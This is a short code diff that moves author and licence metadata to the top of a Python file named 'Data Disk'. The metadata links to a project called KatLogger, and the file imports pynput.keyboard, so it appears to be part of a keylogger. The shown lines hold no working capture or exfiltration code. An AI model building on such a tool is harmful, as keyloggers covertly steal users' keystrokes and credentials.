@@ -1,5 +1,11 @@
 LABEL = "Data Disk"
+import kat
 
+kat.authors("@Lif28, @rickyfili10")
+kat.licence("GPL-3.0 licence")
+kat.licenceFile("../LICENCE", 0)
+kat.link("https://github.com/Lif28/KatLogger/tree/main?tab=GPL-3.0-1-ov-file")
+kat.web("nothing for now :/")
 def player(): 
  import re
  import uuid
@@ -126,13 +132,7 @@ def player():
     kerpy.profiles()
 
     
-import kat
 
-kat.authors("@Lif28, @rickyfili10")
-kat.licence("GPL-3.0 licence")
-kat.licenceFile("../LICENCE", 0)
-kat.link("https://github.com/Lif28/KatLogger/tree/main?tab=GPL-3.0-1-ov-file")
-kat.web("nothing for now :/")
 
 # !!! warning: even if not all libraries are used, leave them anyway in the code !!!
 import pynput.keyboard
